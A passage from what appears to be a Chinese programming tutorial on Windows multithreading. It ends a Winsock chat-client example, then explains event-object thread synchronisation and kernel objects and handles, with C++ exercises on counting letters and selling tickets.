class="string">&quot;Q\n&quot;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">fputs</span>(<span class="string">&quot;Client Down\n&quot;</span>, stdout);</span><br><span class="line">            <span class="built_in">closesocket</span>(hSock);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//拼包发送</span></span><br><span class="line">        <span class="built_in">sprintf</span>(szNameMsg, <span class="string">&quot;%s:%s&quot;</span>, szName, szMsg);</span><br><span class="line">        iLen=<span class="built_in">send</span>(hSock, szNameMsg, (<span class="type">int</span>)<span class="built_in">strlen</span>(szNameMsg), <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;send %d!\n&quot;</span>, iLen);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> WINAPI <span class="title">RecvThreadFUNC</span><span class="params">(<span class="type">void</span>* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    SOCKET hSock = *(SOCKET*)(arg);</span><br><span class="line">    <span class="type">char</span> szNameMsg[MAX_NameSize + MAX_BUFF_SIZE + <span class="number">1</span>] = &#123;&#125;;<span class="comment">//Name : Message</span></span><br><span class="line">    <span class="type">int</span> iLen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memset</span>(szNameMsg, <span class="number">0</span>, MAX_NameSize + MAX_BUFF_SIZE + <span class="number">1</span>);</span><br><span class="line">        <span class="comment">//阻塞并等待服务器消息</span></span><br><span class="line">        iLen = <span class="built_in">recv</span>(hSock, szNameMsg, MAX_NameSize + MAX_BUFF_SIZE + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (iLen == <span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">fputs</span>(<span class="string">&quot;recv stop!\n&quot;</span>, stdout);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">fputs</span>(szNameMsg, stdout);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getCurrentTimeStr</span><span class="params">(<span class="type">char</span>* strtime)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 基于当前系统的当前日期/时间</span></span><br><span class="line">    <span class="type">time_t</span> now = <span class="built_in">time</span>(<span class="literal">NULL</span>);</span><br><span class="line">    tm* ltm = <span class="built_in">localtime</span>(&amp;now);</span><br><span class="line">    <span class="built_in">sprintf</span>(strtime, <span class="string">&quot;%2d:%2d:%2d&quot;</span>, ltm-&gt;tm_hour, ltm-&gt;tm_min, ltm-&gt;tm_sec);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ErrorHandling</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* message, <span class="type">int</span> ERRNO)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">fputs</span>(message, stderr);</span><br><span class="line">    <span class="built_in">fputc</span>(<span class="string">&#x27;\n&#x27;</span>, stderr);</span><br><span class="line">    <span class="type">char</span> ch[<span class="number">64</span>];</span><br><span class="line">    <span class="built_in">getCurrentTimeStr</span>(ch);</span><br><span class="line">    <span class="comment">//printf(&quot;Error num = %d, Error time %s\n&quot;, ::GetLastError(), ch);</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Error num = %d, Error time %s\n&quot;</span>, ERRNO, ch);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意</strong>：<code>main</code>函数的定义：<code>int main(int argc, char* argv[])</code></p><br><h2 id="七-线程同步"><a href="#七-线程同步" class="headerlink" title="七 线程同步"></a>七 线程同步</h2><h3 id="7-1-线程同步之事件对象"><a href="#7-1-线程同步之事件对象" class="headerlink" title="7.1 线程同步之事件对象"></a>7.1 线程同步之事件对象</h3><p>事件对象也属于内核对象，它包含以下三个成员：</p><ul><li>使用计数；</li><li>用于指明该事件是一个自动重置的事件还是一个人工重置的事件的布尔值；</li><li>用于指明该事件处于已通知状态还是未通知状态的布尔值。</li></ul><p>事件对象有两种类型：人工重置的事件对象和自动重置的事件对象。这两种事件对象的区别在于：</p><ul><li>当人工重置的事件对象得到通知时，等待该事件对象的<strong>所有线程</strong>均变为可调度线程；</li><li>而当一个自动重置的事件对象得到通知时，等待该事件对象的线程中<strong>只有一个线程</strong>变为可调度线程。</li></ul><br><p>🔺1、<span style="background:#5de420">创建事件对象</span>：调用<code>CreateEvent</code>函数创建或打开一个命名的或匿名的事件对象。</p><p>🔺2、<span style="background:#5de420">设置事件对象状态</span>：调用<code>SetEvent</code>函数把指定的事件对象设置为有信号状态。</p><p>🔺3、<span style="background:#5de420">重置事件对象状态</span>：调用<code>ResetEvent</code>函数把指定的事件对象设置为无信号状态。</p><p>🔺4、<span style="background:#5de420">请求事件对象</span>：线程通过调用<code>WaitForSingleObject</code>函数请求事件对象。</p><p><code>CreateEvent</code>函数原型如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateEvent</span><span class="params">( 　　</span></span></span><br><span class="line"><span class="params"><span class="function">    LPSECURITY_ATTRIBUTES lpEventAttributes, <span class="comment">// 安全属性 　　</span></span></span></span><br><span class="line"><span class="params"><span class="function">    BOOL bManualReset,<span class="comment">// 复位方式:TRUE 必须用ResetEvent手动复原  FALSE 自动还原为无信号状态</span></span></span></span><br><span class="line"><span class="params"><span class="function">    BOOL bInitialState,<span class="comment">// 初始状态:TRUE 初始状态为有信号状态  FALSE 无信号状态</span></span></span></span><br><span class="line"><span class="params"><span class="function">    LPCTSTR lpName <span class="comment">//对象名称:NULL  无名的事件对象</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p><strong>案例一：</strong></p><ul><li>输入一个全局字串：<code>ABCD</code>或<code>AAADDD</code>。</li><li>要求：通过多线程的方式来判断有几个字母A，必须用线程同步【事件对象】的方式实现。</li><li>实现两个线程的顺序同步，表现在控制线程<code>NumberOfother</code>先于线程<code>NumberOfA</code></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;process.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//- 输入一个全局字串：`ABCD`或`AAADDD`</span></span><br><span class="line"><span class="comment">//- 要求：通过多线程的方式来判断有几个字母A</span></span><br><span class="line"><span class="comment">//- 使用线程同步【事件对象】的方式实现：两个线程的顺序同步</span></span><br><span class="line"><span class="type">char</span> str[<span class="number">100</span>]&#123; <span class="number">0</span> &#125;;</span><br><span class="line">HANDLE hEvent;<span class="comment">//事件对象</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> WINAPI <span class="title">NumberOfA</span><span class="params">(<span class="type">void</span>* arg)</span></span>;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> WINAPI <span class="title">NumberOfother</span><span class="params">(<span class="type">void</span>* arg)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">fputs</span>(<span class="string">&quot;Input string:&quot;</span>, stdout);</span><br><span class="line">    <span class="built_in">fgets</span>(str, <span class="number">100</span>, stdin);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//1 创建事件对象:</span></span><br><span class="line">    hEvent = <span class="built_in">CreateEvent</span>(<span class="literal">NULL</span>, TRUE, FALSE, <span class="literal">NULL</span>);<span class="comment">//手动复位 初始无信号状态</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//两个线程同时操作全局变量，必然需要同步</span></span><br><span class="line">    HANDLE hThreadOfA, hThreadOfother;</span><br><span class="line">    hThreadOfA = (HANDLE)_beginthreadex(<span class="literal">NULL</span>, <span class="number">0</span>, NumberOfA, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    hThreadOfother = (HANDLE)_beginthreadex(<span class="literal">NULL</span>, <span class="number">0</span>, NumberOfother, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//两个线程执行结束后，将事件对象设置为无信号状态</span></span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(hThreadOfA, INFINITE);</span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(hThreadOfother, INFINITE);</span><br><span class="line">    <span class="built_in">ResetEvent</span>(hEvent);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hEvent);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> WINAPI <span class="title">NumberOfA</span><span class="params">(<span class="type">void</span>* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i, cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//阻塞等待</span></span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(hEvent,INFINITE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; str[i] != <span class="number">0</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (str[i] == <span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            cnt++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Number of A = %d\n&quot;</span>, cnt);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> WINAPI <span class="title">NumberOfother</span><span class="params">(<span class="type">void</span>* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i, cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//阻塞等待</span></span><br><span class="line">    <span class="comment">//WaitForSingleObject(hEvent, INFINITE);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; str[i] != <span class="number">0</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (str[i] != <span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            cnt++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Number of Others = %d\n&quot;</span>, --cnt);<span class="comment">//去除字符串末尾</span></span><br><span class="line">    <span class="comment">//设置事件对象为有信号状态</span></span><br><span class="line">    <span class="built_in">SetEvent</span>(hEvent);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>案例二：窗口卖票</strong></p><ul><li>两个窗口买票，要求两个窗口不重复买票</li><li>要求：通过多线程的方式和线程同步【事件对象】的方式实现。</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;process.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> iTickets = <span class="number">100</span>;</span><br><span class="line">HANDLE g_hEvent;<span class="comment">//事件对象</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">long</span> WINAPI <span class="title">SellTicketA</span><span class="params">(<span class="type">void</span>* arg)</span></span>;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">long</span> WINAPI <span class="title">SellTicketB</span><span class="params">(<span class="type">void</span>* arg)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">fputs</span>(<span class="string">&quot;Sell tickets:\n&quot;</span>, stdout);</span><br><span class="line"></span><br><span class="line">    HANDLE hThreadA, hThreadB;</span><br><span class="line">    hThreadA = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, SellTicketA, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    hThreadB = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, SellTicketB, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fputs</span>(<span class="string">&quot;DDDDDDDDDDDDDDDDDDDDDDDDDDD\n&quot;</span>, stdout);</span><br><span class="line">    <span class="comment">/*CloseHandle(hThreadA);</span></span><br><span class="line"><span class="comment">    CloseHandle(hThreadB);*/</span></span><br><span class="line"></span><br><span class="line">    g_hEvent = <span class="built_in">CreateEvent</span>(<span class="literal">NULL</span>, FALSE, FALSE, <span class="literal">NULL</span>);<span class="comment">//自动复位为无信号 初始无信号</span></span><br><span class="line">    <span class="built_in">SetEvent</span>(g_hEvent);<span class="comment">//设置为有信号</span></span><br><span class="line">    <span class="comment">//Sleep(4000);</span></span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(hThreadA, INFINITE);</span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(hThreadB, INFINITE);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(g_hEvent);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">long</span> WINAPI <span class="title">SellTicketA</span><span class="params">(<span class="type">void</span>* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">WaitForSingleObject</span>(g_hEvent, INFINITE);</span><br><span class="line">        <span class="keyword">if</span> (iTickets &gt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">Sleep</span>(<span class="number">1</span>);</span><br><span class="line">            iTickets--;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;A remain %d\n&quot;</span>, iTickets);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">fputs</span>(<span class="string">&quot;No remain ticket!\n&quot;</span>, stdout);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">SetEvent</span>(g_hEvent);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">long</span> WINAPI <span class="title">SellTicketB</span><span class="params">(<span class="type">void</span>* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">WaitForSingleObject</span>(g_hEvent, INFINITE);</span><br><span class="line">        <span class="keyword">if</span> (iTickets &gt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">Sleep</span>(<span class="number">1</span>);</span><br><span class="line">            iTickets--;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;B remain %d\n&quot;</span>, iTickets);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">fputs</span>(<span class="string">&quot;No remain ticket!\n&quot;</span>, stdout);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">SetEvent</span>(g_hEvent);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//0  内核对象被销毁</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><h3 id="7-2-深入理解windows内核对象与句柄"><a href="#7-2-深入理解windows内核对象与句柄" class="headerlink" title="7.2 深入理解windows内核对象与句柄"></a>7.2 深入理解windows内核对象与句柄</h3><h4 id="7-2-1-内核对象"><a href="#7-2-1-内核对象" class="headerlink" title="7.2.1 内核对象"></a>7.2.1 内核对象</h4><ul><li>Windows中每个内核对象都只是一个<span style="background:#5de420">内存块</span>，它由操作系统内核分配，并只能由操作系统内核进行访问，应用程序不能在内存中定位这些数据结构并直接更改其内容。</li><li>这个内存块是一个数据结构，其成员维护着与对象相关的信息。</li><li>少数成员【安全描述符<code>lpAttributes</code>和使用计数】是所有内核对象都有的，但大多数成员都是不同类型对象特有的。</li></ul><p>CreateFile 类型如下：<code>file</code>文件对象、<code>event</code>事件对象、<code>process</code>进程、<code>thread</code>线程、<code>iocompletationport</code>完成端口【windows服务器】、<code>mailslot</code>邮槽、<code>mutex</code>互斥量和 <code>registry</code>注册表 等。</p><h4 id="7-2-2-内核对象的使用计数与生命周期"><a href="#7-2-2-内核对象的使用计数与生命周期" class="headerlink" title="7.2.2 内核对象的使用计数与生命周期"></a>7.2.2 内核对象的使用计数与生命周期</h4><ul><li>内核对象的所有者是操作系统内核，而非进程。换言之也就是说，当进程退出，内核对象不一定会销毁。</li><li>操作系统内核通过内核对象的<span style="background:#5de420">使用计数</span>，知道当前有多少个进程正在使用一个特定的内核对象。<ul><li>初次创建内核对象，使用计数为1。</li><li>当另一个进程获得该内核对象的访问权之后，使用计数加1。</li><li>如果内核对象的使用计数递减为0，操作系统内核就会销毁该内核对象。</li></ul></li><li>也就是说内核对象在当前进程中创建，但是当前进程退出时，内核对象有可能被另外一个进程访问。这时，进程退出只会减少<strong>当前进程</strong>对引用的所有内核对象的使用计数，而不会减少<strong>其他进程</strong>对内核对象的使用计数（即使该内核对象由当前进程创建）。那么内核对象的使用计数未递减为0，操作系统内核不会销毁该内核对象。</li></ul><p><img src="./7-1.png"></p><ol><li>【进程1退出，2不退出时】内核对象A、B的引用计数减为0，被操作系统内核销毁。而进程1只减少自身对C、D的引用计数，不会影响进程2对C、D的引用计数，故此时C、D引用计数不为0，不会被销毁。</li><li>【进程2退出，1不退出时】进程2减少自身对C、D的引用计数，不会影响进程1，故A、B、C、D都不会被销毁</li><li>【进程1、2均退出时】只要ABCD不被别的进程使用，内核对象A、B、C、D的引用计数均递减为0，被内核销毁</li></ol><h4 id="7-2-3-操作内核对象"><a href="#7-2-3-操作内核对象" class="headerlink" title="7.2.3 操作内核对象"></a>7.2.3 操作内核对象</h4><p>Windows提供了一组函数进行操作内核对象。</p><ul><li>成功调用一个创建内核对象的函数后，会返回一个句柄，它表示了所创建的内核对象，可由进程中的任何线程使用。</li><li>在32位进程中，句柄是一个32位值，在64位进程中句柄是一个64位值。我们可以使用唯一标识内核对象的句柄，调用内核操作函数对内核对象进行操作。</li></ul><h4 id="7-2-4-内核对象与其他类型的对象"><a href="#7-2-4-内核对象与其他类型的对象" class="headerlink" title="7.2.4 内核对象与其他类型的对象"></a>7.2.4 内核对象与其他类型的对象</h4><p>Windows进程中除了内核对象还有其他类型的对象，比如窗口，菜单，字体等，这些属于用户对象和GDI对象。</p><p>要区分内核对象与非内核对象，最简单的方式就是查看创建这个对象的函数，几乎所有创建内核对象的函数都有一个允许我们指定<span style="background:#5de420">安全属性</span>的参数。</p><h4 id="7-2-5-注意与补充"><a href="#7-2-5-注意与补充" class="headerlink" title="7.2.5 注意与补充"></a>7.2.5 注意与补充</h4><ol><li><p>一个对象是不是内核对象，通常可以看创建此对象<code>API</code>的参数中是否需要：<code>PSECURITY_ATTRIBUTES</code> 类型的参数。</p></li><li><p>内核对象只是一个内存块，这块内存位于操作系统内核的地址空间，内存块中存放一个数据结构【此数据结构的成员有如：安全描述符、使用计数等】</p></li><li><p>每个进程中有一个句柄表【handle table】，这个句柄表仅供内核对象使用，如下图：</p><p><img src="./7-2.png" alt="img"></p></li><li><p>调用 <code>hThread = CreateThread(... , &amp;threadId);</code> ：当调用了<code>CreateThread</code> 、<code>CreateFile</code> 等创建内核对象的函数后，就是相当于操作系统多了一个内存块，这个内存块就是内核对象。</p><ul><li>此时，内核对象被创建，其数据结构中的引用计数初始为1【这样理解：只要内核对象被创建，其引用计数被初始化为1】。这里实则会发生两件事：创建了一个内核对象和创建线程的函数打开【访问】了此对象，所以内核对象的引用计数加1，这时引用计数就为2了。</li><li>调用API <code>CreateThread</code>的时候，不仅仅是创建了一个内核对象，引用计数+1，还打开了内核对象+1，所以引用计数变为2</li><li>当调用<code>CloseHandle(hThread);</code> 时发生这样的事情：系统通过<code>hThread</code>计算出此句柄在句柄表中的索引，然后把那一项处理后标注为空闲可用的项，内核对象的引用计数减1，即此时此内核对象的引用计数为1，之后这个线程句柄与创建时产生的内核对象已经没有任何关系了【即不能通过hThread句柄去访问内核对象了】</li><li>只有当内核对象的引用计数为0时，内核对象才会被销毁，而此时它的引用计数为1，那它什么时候会被销毁？【当此线程结束的时候，它的引用计数再减1即为0，内核对象被销毁】</li></ul></li></ol><p>此时又有一个新问题产生：我们已经关闭了线程句柄，也就是这个线程句柄已经和内核对象没有瓜葛了，那么那个内核对象是怎么又可以和此线程联系起来了呢？ 其实是创建线程时产生的那个线程ID，代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WinBase.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc</span><span class="params">(LPVOID lpParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;I am comming...&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hThread;</span><br><span class="line">    HANDLE headle2;</span><br><span class="line">    DWORD threadId;</span><br><span class="line"></span><br><span class="line">    hThread = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadProc, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;threadId);<span class="comment">//引用计数=2</span></span><br><span class="line">    <span class="built_in">CloseHandle</span>(hThread);  <span class="comment">//  关闭了线程句柄，引用计数=1</span></span><br><span class="line">    <span class="comment">//可以通过线程ID来再次访问并返回句柄handle</span></span><br><span class="line">    headle2 = <span class="built_in">OpenThread</span>(THREAD_QUERY_INFORMATION, FALSE, threadId);</span><br><span class="line">    headle2 = <span class="built_in">OpenThread</span>(THREAD_QUERY_INFORMATION, FALSE, threadId);</span><br><span class="line">    headle2 = <span class="built_in">OpenThread</span>(THREAD_QUERY_INFORMATION, FALSE, threadId);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><h3 id="7-3-线程同步之信号量"><a href="#7-3-线程同步之信号量" class="headerlink" title="7.3 线程同步之信号量"></a>7.3 线程同步之信号量</h3><blockquote><p>较难，相比于其他线程同步方式用的较少</p></blockquote><p>内核对象的状态：</p><ul><li><p>触发状态【有信号状态】：表示有可用资源；</p></li><li><p>未触发状态【无信号状态】：表示没有可用资源。</p></li></ul><p><span 